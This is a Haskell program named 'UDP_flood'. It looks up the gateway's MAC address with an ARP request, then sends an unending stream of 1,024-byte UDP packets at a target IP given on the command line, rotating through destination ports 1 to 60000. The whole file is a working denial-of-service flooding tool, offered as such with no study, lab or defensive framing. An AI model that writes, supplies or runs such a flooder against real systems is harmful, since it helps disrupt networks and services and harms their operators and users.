{-# LANGUAGE TypeOperators #-}
module Main where

import qualified Data.ByteString.Lazy as B
import Data.Maybe
import Network.Connector
import Control.Lens
import Network.Packet
import Data.Word
import qualified Network.Ethernet as E
import qualified Network.IP as I
import qualified Network.ARP as A
import qualified Network.UDP as U
import qualified Network.Payload as P
import System.Environment
import System.Exit
import Data.IORef

usage   = putStrLn "Usage: UDP_flood interface ip <gateway ip>"
noIface = putStrLn "Error: no interface found with given name"
exit    = exitWith ExitSuccess
die     = exitWith (ExitFailure 1)

arpreq::IPAddr->MACAddr->String->(E.Ethernet:+:A.ARP)
arpreq i m t = (E.ethernet & E.source .~ m
                        & E.dest .~ (read "ff:ff:ff:ff:ff:ff"::MACAddr)) +++
            (A.arp  & A.opcode .~ 1
                    & A.sha .~ m
                    & A.spa .~ i
                    & A.tha .~ (read "00:00:00:00:00:00"::MACAddr)
                    & A.tpa .~ (read t::IPAddr))

packet::IPAddr->String->MACAddr->MACAddr->Word16->(E.Ethernet:+:I.IP:+:U.UDP:+:P.Payload)
packet si di sm dm randport =	(E.ethernet & E.source 	.~ sm
											& E.dest 	.~ dm)+++
								(I.ip 		& I.source 	.~ si
											& I.dest 	.~ (read di::IPAddr))+++
								(U.udp 		& U.source 	.~ 12345
											& U.dest	.~ randport)+++
								(P.payload 	& P.content .~ (B.pack (concat $ replicate 4 [0..255])))

main = do
	args <- getArgs
	if length args /= 3 then usage >> die
	else do
		let [iface,dip,gateway] = args
		im <- getIPMAC iface
		if isJust im == False then noIface
		else do
			let (Just (sip,sha)) = im
			i <- openIface iface
			filterPacket i "arp"
			sendPacket i (arpreq sip sha gateway)
			ptr<-newIORef Nothing
			readPacket i ptr
			arpresp <- readIORef ptr
			mapM_ (sendPacket i) $ [packet sip dip sha (getmac arpresp) i |i<-(concat $ repeat [1..60000])]
				where getmac = (^.A.sha) . (^._2) . get2 . fromJust . toARP 

